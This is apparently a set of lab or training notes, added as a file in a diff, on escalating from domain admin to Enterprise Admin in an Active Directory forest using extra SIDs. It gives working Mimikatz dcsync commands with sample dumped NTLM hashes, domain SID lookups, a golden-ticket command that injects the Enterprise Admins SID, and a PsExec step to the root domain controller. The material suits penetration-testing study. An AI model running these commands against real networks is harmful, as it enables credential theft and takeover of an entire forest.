@@ -1,0 +1,27 @@
+1. Owning the Forest with Extra SIDs
+
+In the context of an Active Directory forest, our ultimate goal is to escalate our privileges from domain admin of one domain to Enterprise admin. 
+We can obtain the NTLM hash of the trust account from the domain controller, just as we did with the krbtgt account.
+
+    lsadump::dcsync /domain:prod.corp1.com /user:corp1$
+          Hash NTLM: cf4bc17dff896101da4f3498a68d50f2
+          SAM Username         : CORP1$
+
+#If a user in prod.corp1.com wants to access a service in corp1.com, the domain controller in prod.corp1.com will create a TGT for corp1.com 
+#First, we'll open a command prompt as the admin user, which is a member of the Domain Admins group in prod.corp1.com. This will simulate our compromise of the domain and allow us to obtain the krbtgt password hash.
+
+    lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
+     Hash NTLM: 4b6af2bf64714682eeef64f516a08949
+
+With the NTLM hash for the krbtgt account from prod.corp1.com, we can create a golden ticket.
+    PS C:\tools> Get-DomainSID -Domain prod.corp1.com
+    S-1-5-21-3776646582-2086779273-4091361643
+
+    PS C:\tools> Get-DomainSid -Domain corp1.com
+    S-1-5-21-1095350385-1831131555-2412080359
+
+Now we are ready to craft the golden ticket that will grant us Enterprise Admin membership in corp1.com
+
+    kerberos::golden /user:h4x /domain:prod.corp1.com /sid:S-1-5-21-3776646582-2086779273-4091361643 /krbtgt:4b6af2bf64714682eeef64f516a08949 /sids:S-1-5-21-1095350385-1831131555-2412080359-519 /ptt
+
+    c:\tools\SysinternalsSuite\PsExec.exe \\rdc01 cmd
